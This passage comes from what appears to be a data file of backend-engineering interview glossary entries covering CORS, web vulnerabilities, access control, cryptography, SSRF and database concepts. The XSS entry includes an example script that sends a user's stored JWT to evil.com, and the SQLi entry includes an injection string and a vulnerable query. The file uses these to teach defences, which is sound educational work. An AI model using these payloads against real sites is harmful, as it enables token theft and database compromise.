          'Returning an access token directly in the URL (the legacy Implicit flow) exposes the token in browser history, server referrer headers, and browser extensions. Instead, the Authorization Code flow returns a one-time short-lived `code` in the URL, which the backend exchanges securely server-to-server (or with PKCE verifier) for the actual tokens.',
      },
    ],
    relatedTerms: ['jwt', 'sso', 'rbac', 'mfa'],
  },
  {
    id: 'cors',
    term: 'CORS',
    fullForm: 'Cross-Origin Resource Sharing',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'Critical',
    shortSummary: 'A browser security mechanism based on HTTP headers that controls which external frontend domains are permitted to read responses from your backend API.',
    detailedDefinition:
      'By default, web browsers enforce the **Same-Origin Policy (SOP)**, which blocks JavaScript running on Origin A (`https://app.example.com`) from reading HTTP responses fetched from Origin B (`https://api.example.com`) unless Origin B explicitly opts in. Cross-Origin Resource Sharing (CORS) is the HTTP header mechanism (`Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, `Access-Control-Allow-Credentials`) that your Python backend sends to tell the browser which frontend origins are trusted. For non-simple requests (like `DELETE`, `PUT`, or requests with `Authorization: Bearer` or `application/json`), the browser automatically sends a preflight `OPTIONS` request first.',
    whereAndWhyUsed:
      'Used in every decoupled architecture where your React/Vue/Next.js frontend is hosted on one domain/port (e.g., `localhost:3000` or `myapp.netlify.app`) and your Django/FastAPI backend is hosted on another (`localhost:8000` or `api.myapp.com`).',
    realWorldExample:
      'In Django, you install `django-cors-headers`, add `CorsMiddleware` at the top of `MIDDLEWARE`, and configure `CORS_ALLOWED_ORIGINS = ["https://myapp.netlify.app"]`. In FastAPI, you add `CORSMiddleware` with explicit `allow_origins`.',
    codeSnippet: `# FastAPI CORS Configuration
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://myapp.netlify.app", "http://localhost:3000"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
)`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does CORS stand for, and why does my API work in Postman/curl but fail with a CORS error in Chrome?',
        answer:
          'CORS stands for Cross-Origin Resource Sharing. CORS is enforced strictly by **web browsers** to protect logged-in users from malicious websites reading cross-origin data. Tools like Postman, curl, or Python `requests` are not browsers, do not enforce the Same-Origin Policy, and ignore CORS headers completely.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'What is a CORS Preflight request, and why is setting Access-Control-Allow-Origin: "*" dangerous if allow_credentials is True?',
        answer:
          'Before sending a cross-origin request with JSON or an `Authorization` header, the browser sends an HTTP `OPTIONS` preflight request asking the server which methods and headers are allowed. Browsers actually forbid combining `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` because allowing *any* website on the internet to make authenticated cookie/credential requests on behalf of the user would expose private user data to every malicious domain.',
      },
    ],
    relatedTerms: ['csrf', 'xss', 'http', 'drf'],
  },
  {
    id: 'csrf-xss-sqli',
    term: 'CSRF, XSS & SQLi',
    fullForm: 'Cross-Site Request Forgery, Cross-Site Scripting & SQL Injection',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'Critical',
    shortSummary: 'The three classic web application vulnerabilities: tricking authenticated browsers (CSRF), injecting malicious client scripts (XSS), and injecting malicious SQL (SQLi).',
    detailedDefinition:
      'These three acronyms appear in almost every backend security interview:\n' +
      '1. **CSRF (Cross-Site Request Forgery)**: An attack where a malicious site (`evil.com`) tricks a victim’s browser into sending an unwanted state-changing request (`POST /bank/transfer`) to a site where the victim is currently logged in via session cookies (`bank.com`), because browsers automatically attach cookies to cross-site requests.\n' +
      '2. **XSS (Cross-Site Scripting)**: An attack where an attacker injects malicious JavaScript into content viewed by other users (e.g., an unescaped comment `<script>fetch("https://evil.com?token="+localStorage.jwt)</script>`), allowing the attacker to steal tokens or hijack sessions.\n' +
      '3. **SQLi (SQL Injection)**: An attack where unsanitized user input is concatenated directly into a raw SQL string (e.g., `"SELECT * FROM users WHERE username = \'" + user_input + "\'"`), allowing an attacker to pass `\' OR \'1\'=\'1` or `DROP TABLE` and bypass authentication or steal the entire database.',
    whereAndWhyUsed:
      'Every backend engineer must actively defend against all three: using CSRF tokens + `SameSite=Lax/Strict` cookies for CSRF; output auto-escaping + Content Security Policy (CSP) + `HttpOnly` cookies for XSS; and ORM / parameterized prepared statements for SQLi.',
    realWorldExample:
      'Django’s `CsrfViewMiddleware` blocks state-changing cookie requests without a valid `X-CSRFToken`; React and Django Templates automatically escape HTML output to prevent XSS; and Django ORM / SQLAlchemy bind parameters (`WHERE email = %s`, `[email]`) so user input is treated strictly as a literal value, never executable SQL.',
    codeSnippet: `# ❌ VULNERABLE TO SQL INJECTION (Never use f-strings in raw SQL!):
cursor.execute(f"SELECT * FROM users WHERE email = '{user_email}'")

# ✅ SAFE PARAMETERIZED QUERY (Driver escapes input strictly as data):
cursor.execute("SELECT * FROM users WHERE email = %s", [user_email])`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'Expand CSRF, XSS, and SQLi, and explain the core difference between XSS and CSRF.',
        answer:
          'CSRF = Cross-Site Request Forgery; XSS = Cross-Site Scripting; SQLi = SQL Injection. The classic distinction between XSS and CSRF is trust direction: in **CSRF**, an external site abuses the trust that the *server* has in the user’s browser (via automatic session cookies). In **XSS**, an attacker abuses the trust that the *user’s browser* has in code served from your website (by injecting malicious JavaScript into your page).',
      },
      {
        questionType: 'Where & Why Used',
        question: 'If your REST API uses `Authorization: Bearer <JWT>` headers instead of cookies, is it vulnerable to CSRF?',
        answer:
          'No! CSRF relies on the browser *automatically* attaching credentials (like session cookies) when a third-party site submits a form or fetch request. Browsers never automatically attach a custom `Authorization: Bearer` header—JavaScript on the origin must explicitly attach it. However, if you store that JWT in `localStorage`, it becomes vulnerable to theft via **XSS**.',
      },
    ],
    relatedTerms: ['cors', 'jwt', 'orm', 'sql', 'ssrf', 'waf'],
  },
  {
    id: 'rbac-abac-acl',
    term: 'RBAC, ABAC & ACL',
    fullForm: 'Role-Based Access Control, Attribute-Based Access Control & Access Control List',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'High',
    shortSummary: 'Three authorization models for deciding who can perform which actions: by assigned Role (RBAC), by dynamic context Attributes (ABAC), or by explicit per-resource lists (ACL).',
    detailedDefinition:
      '- **RBAC (Role-Based Access Control)**: Permissions (`can_approve_invoice`, `can_delete_user`) are grouped into Roles (`Admin`, `Manager`, `Viewer`), and users are assigned roles. Easy to audit and maintain.\n' +
      '- **ABAC (Attribute-Based Access Control)**: Fine-grained authorization evaluated dynamically using attributes of the User (department="Finance", clearance=3), the Resource (invoice_amount < 10000, owner_id=user.id), and the Environment (time_of_day="business_hours", ip_range="corporate_vpn").\n' +
      '- **ACL (Access Control List)**: A list attached directly to a specific resource (like a Google Doc or S3 object) specifying exactly which users/principals have Read/Write access to that item.',
    whereAndWhyUsed:
      'Used in enterprise SaaS apps, multi-tenant platforms, cloud IAM (AWS IAM combines RBAC + ABAC policies), and DRF custom permission classes (`has_permission` for RBAC, `has_object_permission` for ABAC/ownership).',
    realWorldExample:
      'In a healthcare app, RBAC says "Only users with the `Doctor` role can view medical charts" (`has_permission`), while ABAC adds "A Doctor can only view a chart if `chart.hospital_id == doctor.hospital_id` and the doctor is currently on shift" (`has_object_permission`).',
    codeSnippet: `# DRF combining Role-Based (RBAC) + Object-Attribute (ABAC) check:
class IsManagerOrOwnerPermission(permissions.BasePermission):
    def has_object_permission(self, request, view, obj):
        if request.user.role == "MANAGER":  # RBAC check
            return obj.department_id == request.user.department_id  # ABAC check
        return obj.owner_id == request.user.id  # Ownership check`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do RBAC, ABAC, and ACL stand for, and when does RBAC alone become insufficient?',
        answer:
          'RBAC is Role-Based Access Control, ABAC is Attribute-Based Access Control, and ACL is Access Control List. RBAC alone becomes insufficient when access depends on dynamic relationships or context—such as "An editor can only edit articles they authored themselves within 24 hours of publication." Instead of creating thousands of roles ("Role Explosion"), you combine RBAC with object-level ABAC checks.',
      },
    ],
    relatedTerms: ['jwt', 'oauth', 'iam', 'drf'],
  },
  {
    id: 'hmac-aes-rsa',
    term: 'HMAC, AES & RSA',
    fullForm: 'Hash-Based Message Authentication Code, Advanced Encryption Standard & Rivest–Shamir–Adleman',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'High',
    shortSummary: 'The three foundational cryptographic building blocks: HMAC for webhook/message integrity, AES for fast symmetric encryption, and RSA for public-key asymmetric cryptography.',
    detailedDefinition:
      '- **HMAC (Hash-Based Message Authentication Code)**: Combines a cryptographic hash function (like SHA-256) with a shared secret key to verify both the *data integrity* and *authenticity* of a message.\n' +
      '- **AES (Advanced Encryption Standard)**: A fast symmetric-key encryption algorithm where the exact same secret key encrypts plaintext and decrypts ciphertext (e.g. AES-256-GCM).\n' +
      '- **RSA (Rivest–Shamir–Adleman)**: An asymmetric public-key algorithm using a key pair—a **Public Key** (shared openly to encrypt data or verify signatures) and a **Private Key** (kept strictly secret to decrypt data or sign JWTs).',
    whereAndWhyUsed:
      'HMAC is used to verify Stripe/GitHub webhooks (`X-Hub-Signature-256`) and HS256 JWTs. AES encrypts sensitive database columns (PII) and HTTPS traffic after handshake. RSA signs RS256 JWTs in microservices so auth servers sign with the Private Key and 20 downstream microservices verify with the Public Key.',
    realWorldExample:
      'When Stripe sends a `payment_intent.succeeded` webhook to your Django API, anyone on the internet could POST fake JSON to your webhook URL. Your backend computes `hmac.new(STRIPE_WEBHOOK_SECRET, request.body, hashlib.sha256)` and compares it with `hmac.compare_digest()` against the `Stripe-Signature` header.',
    codeSnippet: `import hmac, hashlib

def verify_webhook_signature(payload_bytes: bytes, header_sig: str, secret: str) -> bool:
    expected = hmac.new(secret.encode(), payload_bytes, hashlib.sha256).hexdigest()
    # Always use compare_digest to prevent timing attacks!
    return hmac.compare_digest(expected, header_sig)`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do HMAC, AES, and RSA stand for, and what is the difference between symmetric and asymmetric encryption?',
        answer:
          'HMAC = Hash-Based Message Authentication Code; AES = Advanced Encryption Standard; RSA = Rivest–Shamir–Adleman. Symmetric encryption (AES) uses one shared secret key for both encryption and decryption—it is extremely fast for large data. Asymmetric encryption (RSA) uses a mathematically linked Public Key and Private Key pair—it is slower, so in TLS/HTTPS it is used during the initial handshake or digital signatures, while AES encrypts the actual data stream.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'In a microservices architecture using JWTs, why is RS256 (RSA) preferred over HS256 (HMAC)?',
        answer:
          'With HS256 (symmetric HMAC), every single microservice that verifies a JWT must possess the exact same `SECRET_KEY` used to sign it—meaning if one minor microservice is compromised, an attacker can forge new admin JWTs. With RS256 (asymmetric RSA), only the central Auth Service holds the Private Key to sign tokens, while all other microservices only hold the read-only Public Key to verify them.',
      },
    ],
    relatedTerms: ['jwt', 'tls', 'ssh', 'pii'],
  },
  {
    id: 'sso-mfa-otp-pii',
    term: 'SSO, MFA, OTP & PII',
    fullForm: 'Single Sign-On, Multi-Factor Authentication, One-Time Password & Personally Identifiable Information',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'Essential',
    shortSummary: 'Core identity and compliance terms: logging in once across apps (SSO), requiring 2+ verification factors (MFA/OTP), and safeguarding personal user data (PII).',
    detailedDefinition:
      '- **SSO (Single Sign-On)**: An authentication scheme (built on SAML 2.0 or OIDC) that lets a user log in once with a central Identity Provider (Okta, Google Workspace, Azure AD) and gain access to multiple independent software applications without re-entering credentials.\n' +
      '- **MFA (Multi-Factor Authentication)**: Requires a user to present two or more distinct factors: Something you *know* (password), Something you *have* (authenticator app / hardware key), or Something you *are* (biometrics).\n' +
      '- **OTP (One-Time Password)**: A dynamically generated numeric code (such as a 6-digit TOTP code rotating every 30 seconds) valid for only one login session.\n' +
      '- **PII (Personally Identifiable Information)**: Any data that can directly or indirectly identify an individual (full name, SSN, passport number, email, phone, IP address), governed by strict privacy laws like GDPR and CCPA.',
    whereAndWhyUsed:
      'Used in enterprise B2B SaaS onboarding (SSO + MFA enforcement) and database logging/auditing pipelines (masking PII so emails or tax IDs never leak into plain-text application logs).',
    realWorldExample:
      'When writing structured logs in Python, you redact PII fields (`email`, `phone`, `ssn`, `credit_card`) in a custom logging filter before shipping logs to Datadog or CloudWatch.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do SSO, MFA, OTP, and PII stand for, and how should a backend developer handle PII in database and log design?',
        answer:
          'SSO = Single Sign-On, MFA = Multi-Factor Authentication, OTP = One-Time Password, and PII = Personally Identifiable Information. A backend developer must encrypt sensitive PII at rest (AES), transmit it only over HTTPS/TLS, mask or strip PII from application logs and error trackers (Sentry), and support "Right to Erasure" (GDPR deletion/anonymization).',
      },
    ],
    relatedTerms: ['oauth', 'oidc', 'aes', 'rbac'],
  },
  {
    id: 'ssrf-waf-dos',
    term: 'SSRF, WAF & DDoS',
    fullForm: 'Server-Side Request Forgery, Web Application Firewall & Distributed Denial of Service',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'High',
    shortSummary: 'Infrastructure & network security terms: preventing servers from fetching internal cloud metadata URLs (SSRF), filtering malicious HTTP traffic (WAF), and surviving traffic floods (DDoS).',
    detailedDefinition:
      '- **SSRF (Server-Side Request Forgery)**: A critical vulnerability where an API accepts a URL from a user (e.g., `"Import avatar from URL"` or `"Register webhook URL"`) and fetches it from the backend server without validating the destination IP. An attacker passes `http://169.254.169.254/latest/meta-data/` (AWS EC2 metadata service) or `http://localhost:6379` (internal Redis) to steal cloud IAM credentials from inside your private VPC.\n' +
      '- **WAF (Web Application Firewall)**: A layer-7 security shield (like Cloudflare WAF or AWS WAF) sitting in front of your backend that inspects HTTP headers/bodies to block SQLi, XSS, and bot traffic.\n' +
      '- **DoS / DDoS (Distributed Denial of Service)**: An attack that floods a server or API with millions of requests from a distributed botnet to exhaust CPU, memory, or database connections.',
    whereAndWhyUsed:
      'Relevant whenever your Python backend fetches user-supplied URLs (`requests.get(user_url)`), processes webhooks, or exposes public endpoints that need rate-limiting (DRF `Throttle` classes, Nginx `limit_req`, and Cloudflare WAF).',
    realWorldExample:
      'To prevent SSRF in a Python URL preview service, you resolve the hostname’s IP address first and block all private/loopback IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`) using Python’s `ipaddress.ip_address(ip).is_private` before making the HTTP request.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does SSRF stand for, and why is it one of the most dangerous vulnerabilities in cloud-hosted Python backends?',
        answer:
          'SSRF stands for Server-Side Request Forgery. In cloud environments like AWS, GCP, or Kubernetes, internal services and instance metadata endpoints (`169.254.169.254`) trust requests originating from inside the server or VPC. If an attacker tricks your Python backend into fetching an internal URL and returning the response, they can extract temporary AWS IAM keys and take over the cloud account.',
      },
    ],
    relatedTerms: ['csrf-xss-sqli', 'vpc', 'iam', 'cdn'],
  },

  // ==========================================
  // STAGE 3: DATABASES, TRANSACTIONS, CACHING & DATA INTEGRITY
  // ==========================================
  {
    id: 'acid',
    term: 'ACID',
    fullForm: 'Atomicity, Consistency, Isolation, Durability',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'Critical',
    shortSummary: 'The four foundational guarantees of reliable database transactions that ensure data remains accurate despite crashes, errors, or concurrent requests.',
    detailedDefinition:
      'ACID defines the four properties that guarantee safe database transactions in relational systems like PostgreSQL:\n' +
      '- **Atomicity ("All or Nothing")**: Every statement inside a transaction (`BEGIN ... COMMIT`) succeeds together as a single indivisible unit, or if any step fails, the entire transaction rolls back (`ROLLBACK`) leaving zero partial side effects.\n' +
      '- **Consistency ("Valid State to Valid State")**: A committed transaction never violates database invariants, foreign keys, `UNIQUE` constraints, or `CHECK (balance >= 0)` rules.\n' +
      '- **Isolation ("No Concurrent Interference")**: Concurrent transactions executing at the same millisecond do not corrupt each other or see half-finished uncommitted writes (controlled via Isolation Levels like Read Committed, Repeatable Read, and Serializable).\n' +
      '- **Durability ("Permanent Once Committed")**: Once `COMMIT` returns success, the changes are written to non-volatile disk (via Write-Ahead Logging / WAL) and survive even if the server loses power 1 millisecond later.',
    whereAndWhyUsed:
      'Used in financial transfers, wallet debits, inventory stock decrements, order creation, and any multi-table write in Django (`with transaction.atomic():`) or SQLAlchemy.',
    realWorldExample:
      'When transferring $100 from Account A to Account B in Django, you wrap both updates inside `with transaction.atomic():` and lock the rows using `Account.objects.select_for_update().filter(id__in=[a_id, b_id])`. If crediting Account B raises an exception, Atomicity rolls back Account A’s debit automatically, while `select_for_update()` guarantees Isolation against race conditions.',
    codeSnippet: `from django.db import transaction

def transfer_funds(sender_id: int, receiver_id: int, amount: int):
    with transaction.atomic():  # Guarantees Atomicity
        # Lock rows in deterministic ID order to prevent deadlocks (Isolation)
        accounts = list(
            Account.objects.select_for_update()
            .filter(id__in=[sender_id, receiver_id])
            .order_by('id')
        )
        sender = next(a for a in accounts if a.id == sender_id)
        receiver = next(a for a in accounts if a.id == receiver_id)
        if sender.balance < amount:
            raise ValueError("Insufficient funds")
        sender.balance -= amount
        receiver.balance += amount
        sender.save()
        receiver.save()`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does each letter of ACID stand for, and how would you explain all four using a bank transfer example?',
        answer:
          'ACID stands for Atomicity, Consistency, Isolation, and Durability. In a $100 bank transfer from Alice to Bob: **Atomicity** ensures that if deducting $100 from Alice succeeds but adding $100 to Bob crashes, Alice gets her $100 back (no money vanishes). **Consistency** ensures `CHECK (balance >= 0)` rules and account totals remain valid. **Isolation** ensures that if Alice initiates two concurrent $100 transfers when she only has $100, they don’t both read $100 at the same time and double-spend. **Durability** ensures that once the app shows "Transfer Complete", a power outage won’t erase the record.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'In Django, how does transaction.atomic() work, and why do you also need select_for_update() for race conditions?',
        answer:
          '`transaction.atomic()` wraps the block in a SQL transaction (or `SAVEPOINT` if nested) so any unhandled Python exception triggers a `ROLLBACK` (Atomicity). However, under PostgreSQL’s default `READ COMMITTED` isolation level, two concurrent workers can still read the same row value in Python (`balance = 100`) before either writes back. Adding `.select_for_update()` issues a `SELECT ... FOR UPDATE` row-level lock, forcing the second transaction to wait until the first transaction commits.',
      },
    ],
    relatedTerms: ['rdbms', 'sql', 'mvcc', 'wal', 'orm', 'idempotency'],
  },
  {
    id: 'rdbms-nosql',
    term: 'RDBMS, DBMS & NoSQL',
    fullForm: 'Relational Database Management System & Not Only SQL',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'Critical',
    shortSummary: 'DBMS is software managing data; RDBMS organizes structured data into strict relational tables with foreign keys (PostgreSQL/MySQL); NoSQL offers flexible non-relational models (MongoDB/Redis/DynamoDB).',
    detailedDefinition:
      'A **DBMS (Database Management System)** is any system software for creating and managing databases. An **RDBMS (Relational Database Management System)** stores data in structured tables (relations) of rows (tuples) and columns (attributes), enforcing strict schemas, normalization, foreign-key relationships, and ACID transactions via SQL (e.g., PostgreSQL, MySQL). **NoSQL ("Not Only SQL")** encompasses non-relational database engines built for flexible schemas, massive horizontal partitioning, or specialized access patterns: Document stores (MongoDB), Key-Value caches (Redis), Wide-Column stores (Cassandra), and Graph databases (Neo4j).',
    whereAndWhyUsed:
      'Use RDBMS (PostgreSQL) as the primary system of record for users, billing, orders, and relational domain data. Use NoSQL alongside it for high-speed caching/queues (Redis), unstructured event/log ingestion (DynamoDB/Cassandra), or rapidly changing nested document catalogs (MongoDB—or use PostgreSQL’s `JSONB` column to get both in one engine!).',
    realWorldExample:
      'An e-commerce platform uses PostgreSQL (RDBMS) for Users, Orders, and Payments where ACID transactions and relational JOINs are critical, and pairs it with Redis (NoSQL Key-Value) for shopping cart sessions and rate-limiting counters.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do RDBMS and NoSQL stand for, and why does NoSQL mean "Not Only SQL" rather than "No SQL"?',
        answer:
          'RDBMS stands for Relational Database Management System, and NoSQL stands for Not Only SQL. It means "Not Only SQL" because modern architectures rarely reject relational databases entirely—instead, they combine relational SQL databases for transactional integrity with specialized non-relational stores (or SQL engines with JSONB support) where appropriate.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'When an interviewer asks "Should we use PostgreSQL (SQL) or MongoDB (NoSQL) for our new backend?", how do you answer?',
        answer:
          'Evaluate 4 criteria: (1) **Data Structure & Relationships**: If entities have many-to-many or relational joins, choose RDBMS (PostgreSQL). (2) **Transaction Guarantees**: If multi-table ACID transactions are critical (fintech, inventory), choose RDBMS. (3) **Schema Flexibility**: If records are self-contained documents with wildly varying fields per tenant, Document NoSQL or Postgres `JSONB` fits well. (4) **Scale Pattern**: RDBMS scales vertically and via read replicas easily; NoSQL like Cassandra/DynamoDB is built for multi-node write sharding at extreme scale.',
      },
    ],
    relatedTerms: ['sql', 'acid', 'pk-fk', 'oltp-olap', 'ttl'],
  },
  {
    id: 'pk-fk-erd',
    term: 'PK, FK & ERD',
    fullForm: 'Primary Key, Foreign Key & Entity-Relationship Diagram',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'High',
    shortSummary: 'Core relational schema concepts: uniquely identifying a row (PK), linking rows across tables with referential integrity (FK), and mapping table relationships visually (ERD).',
    detailedDefinition:
      '- **PK (Primary Key)**: A column (or composite set of columns) that uniquely identifies every single row in a table. A Primary Key is implicitly `NOT NULL` and `UNIQUE`, and the RDBMS automatically builds a B-Tree index on it.\n' +
      '- **FK (Foreign Key)**: A column in one table that references the Primary Key of another table (e.g., `orders.user_id` referencing `users.id`), enforcing **referential integrity** so you can never insert an order for a non-existent user.\n' +
      '- **ERD (Entity-Relationship Diagram)**: A visual architectural diagram showing database tables (Entities), their columns, Primary/Foreign keys, and cardinality (`1:1`, `1:N` One-to-Many, `M:N` Many-to-Many via a junction table).',
    whereAndWhyUsed:
      'Used in every Django model design (`models.ForeignKey`, `models.ManyToManyField`, `models.OneToOneField`) and system design schema whiteboarding round.',
    realWorldExample:
      'In Django, `user = models.ForeignKey(User, on_delete=models.CASCADE, db_index=True)` creates a `user_id` Foreign Key column in the database with an index and defines what happens when the parent User is deleted (`CASCADE`, `PROTECT`, or `SET_NULL`).',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do PK, FK, and ERD stand for, and when should you use UUID vs Auto-Incrementing BigInt as a Primary Key?',
        answer:
          'PK = Primary Key, FK = Foreign Key, ERD = Entity-Relationship Diagram. Auto-incrementing `BIGINT` (8 bytes) is compact, sequential, and fast for B-Tree index inserts, but exposes record counts (`id=45`) in public URLs. `UUIDv4` (16 bytes) is globally unique across distributed databases and safe to expose in URLs, though random UUIDv4s can cause B-Tree page fragmentation at massive scale—which is why modern backends often use sequential `UUIDv7` or keep an internal `BIGINT` PK alongside a public `uuid` column.',
      },
    ],
    relatedTerms: ['sql', 'rdbms-nosql', 'orm', 'ddl-dml-dql'],
  },
  {
    id: 'ddl-dml-dql',
    term: 'DDL, DML, DQL, DCL & TCL',
    fullForm: 'Data Definition, Manipulation, Query, Control & Transaction Control Languages',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'High',
    shortSummary: 'The five functional subsets of SQL commands: schema structure (DDL), row mutations (DML), reading data (DQL), permissions (DCL), and transaction boundaries (TCL).',
    detailedDefinition:
      'SQL statements are classified into five sub-languages based on what they operate on:\n' +
      '- **DDL (Data Definition Language)**: Defines or alters table schemas and indexes (`CREATE TABLE`, `ALTER TABLE`, `DROP TABLE`, `TRUNCATE`). Generated by `python manage.py makemigrations`.\n' +
      '- **DML (Data Manipulation Language)**: Inserts, modifies, or deletes row data inside tables (`INSERT`, `UPDATE`, `DELETE`, `MERGE`).\n' +
      '- **DQL (Data Query Language)**: Queries and retrieves rows (`SELECT ... FROM ... WHERE`).\n' +
      '- **DCL (Data Control Language)**: Grants or revokes user access privileges (`GRANT SELECT ON orders TO readonly_user`, `REVOKE`).\n' +
      '- **TCL (Transaction Control Language)**: Manages ACID transaction boundaries (`BEGIN`, `COMMIT`, `ROLLBACK`, `SAVEPOINT`).',
    whereAndWhyUsed:
      'Used in database administration, migration reviews (knowing which DDL operations lock tables in production PostgreSQL), and SQL technical screenings.',
    realWorldExample:
      'Running `DELETE FROM logs` (DML) scans rows one by one, fires triggers, and writes undo logs, whereas `TRUNCATE TABLE logs` (DDL) instantly deallocates the data pages.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What is the difference between DELETE, TRUNCATE, and DROP in SQL, and which sub-language does each belong to?',
        answer:
          '`DELETE` is a **DML** command that removes specific rows matching a `WHERE` clause one by one (logging each deletion). `TRUNCATE` is a **DDL** command that quickly empties *all* rows from a table while keeping the table structure and indexes intact. `DROP` is a **DDL** command that completely deletes the entire table, its data, its schema, and its indexes from the database.',
      },
    ],
    relatedTerms: ['sql', 'acid', 'rdbms-nosql', 'pk-fk-erd'],
  },
  {
    id: 'mvcc-wal',
    term: 'MVCC & WAL',
    fullForm: 'Multi-Version Concurrency Control & Write-Ahead Logging',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'High',
    shortSummary: 'How PostgreSQL achieves speed and safety under the hood: MVCC lets readers and writers work concurrently without blocking each other; WAL guarantees crash-safe durability.',
    detailedDefinition:
      '- **MVCC (Multi-Version Concurrency Control)**: Instead of locking an entire table or blocking `SELECT` queries while an `UPDATE` is running, PostgreSQL maintains multiple physical versions ("tuples") of a row tagged with transaction IDs (`xmin`, `xmax`). Each transaction sees a consistent **snapshot** of the database as of a specific point in time—meaning **"Readers never block writers, and writers never block readers."**\n' +
      '- **WAL (Write-Ahead Logging)**: Before PostgreSQL modifies actual table data pages on disk, it sequentially appends the change to an append-only Write-Ahead Log file on disk. Because sequential disk writes are super fast, `COMMIT` finishes quickly while guaranteeing **Durability** (the "D" in ACID): if the server crashes, PostgreSQL replays the WAL on startup to recover every committed transaction.',
    whereAndWhyUsed:
      'Used internally by PostgreSQL, MySQL (InnoDB), and SQLite (WAL mode), as well as for database replication (streaming WAL logs to read replicas) and Change Data Capture (CDC).',
    realWorldExample:
      'When an analytics dashboard runs a 3-second `SELECT SUM(...)` query on the `orders` table in PostgreSQL while customers are actively placing new orders via `INSERT`/`UPDATE`, MVCC allows both to run concurrently with zero lock contention.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do MVCC and WAL stand for, and how do they implement the "I" and "D" in ACID?',
        answer:
          'MVCC stands for Multi-Version Concurrency Control, and WAL stands for Write-Ahead Logging. MVCC implements **Isolation ("I")** by keeping row versions with transaction IDs so concurrent readers see a consistent snapshot without blocking concurrent writers. WAL implements **Durability ("D")** by flushing transaction records to an append-only disk log before reporting a `COMMIT` as successful, enabling crash recovery and read-replica streaming.',
      },
    ],
    relatedTerms: ['acid', 'rdbms-nosql', 'oltp-olap', 'cdc-etl'],
  },
  {
    id: 'oltp-olap-etl-cdc',
    term: 'OLTP, OLAP, ETL / ELT & CDC',
    fullForm: 'Online Transaction Processing, Online Analytical Processing, Extract-Transform-Load & Change Data Capture',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 3,
    priority: 'High',
    shortSummary: 'Data architecture patterns: fast row-oriented operational DBs (OLTP), column-oriented analytics warehouses (OLAP), data pipelines (ETL/ELT), and real-time DB change streaming (CDC).',
    detailedDefinition:
      '- **OLTP (Online Transaction Processing)**: Row-oriented databases (PostgreSQL, MySQL) optimized for thousands of fast, concurrent, small CRUD transactions (`INSERT` order, `UPDATE` user balance) with millisecond latency.\n' +
      '- **OLAP (Online Analytical Processing)**: Columnar data warehouses (Snowflake, BigQuery, ClickHouse, Redshift) optimized for scanning millions of rows across a few columns to compute business intelligence aggregations (`AVG`, `SUM`, multi-year trends).\n' +
      '- **ETL / ELT (Extract, Transform, Load)**: Pipelines (like Airflow + dbt) that extract data from production OLTP databases, transform/clean it, and load it into an OLAP warehouse.\n' +
      '- **CDC (Change Data Capture)**: A pattern (using tools like Debezium reading PostgreSQL’s WAL) that captures every `INSERT`/`UPDATE`/`DELETE` event in real time and streams it to Kafka or a data warehouse without slowing down production queries.',
    whereAndWhyUsed:
      'Used in system design interviews whenever an interviewer asks: "How do we run heavy executive analytics reports without slowing down our live production PostgreSQL database?"',
    realWorldExample:
      'Your Django app writes live checkout orders to an AWS RDS PostgreSQL database (OLTP). Debezium captures those changes via CDC from the WAL log and streams them into BigQuery (OLAP) via an ELT pipeline so data scientists can query 500M rows without touching RDS.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'Expand OLTP, OLAP, ETL, and CDC. Why shouldn’t you run heavy OLAP analytical queries directly on your primary OLTP database?',
        answer:
          'OLTP = Online Transaction Processing; OLAP = Online Analytical Processing; ETL = Extract, Transform, Load; CDC = Change Data Capture. Running heavy full-table OLAP scans directly on your primary OLTP database exhausts CPU, disk I/O, and buffer-pool cache memory, causing live customer checkout and login requests to time out. Offload analytics to a read replica or an OLAP warehouse via ETL/CDC.',
      },
    ],
    relatedTerms: ['rdbms-nosql', 'mvcc-wal', 'sql'],
  },
  {
    id: 'ttl-lru-lfu',
    term: 'TTL, LRU & LFU (Caching)',
    fullForm: 'Time To Live, Least Recently Used & Least Frequently Used',
    isAcronym: true,
    category: 'Messaging & Caching',
    roadmapStage: 3,
    priority: 'Critical',
